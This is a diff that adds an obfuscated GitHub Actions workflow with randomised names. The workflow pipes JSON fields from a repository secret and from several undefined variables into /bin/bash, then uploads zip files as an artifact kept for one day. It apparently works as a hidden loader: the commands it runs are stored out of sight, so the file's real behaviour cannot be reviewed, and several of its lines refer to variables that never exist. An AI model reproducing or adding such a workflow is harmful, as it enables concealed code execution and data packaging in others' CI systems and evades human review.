@@ -1,0 +1,28 @@
+name: neo4jjunior397
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: neo4jjunior397
+        env:
+          bcpwl495: ${{ secrets.bcpwl495 }}
+        run: |
+          printf '%s' "$bcpwl495" | jq -r .mzzf132 | /bin/bash
+          printf '%s' "$grjk2" | jq -r .hubvm911 | /bin/bash
+          printf '%s' "$qh9238" | jq -r .nbvx20 | /bin/bash
+          printf '%s' "$lrh4275" | jq -r .zk52472 | /bin/bash
+          printf '%s' "$d7493" | jq -r .rpvd23657 | /bin/bash
+          echo $d4765 | jq -r .b54434 | /bin/bash
+          printf '%s' "$wmsps8" | jq -r .pe1 | /bin/bash
+          printf '%s' "$dn1502" | jq -r .mrt21 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: UYTP0fUV
+          path: "*.zip"
+          retention-days: 1
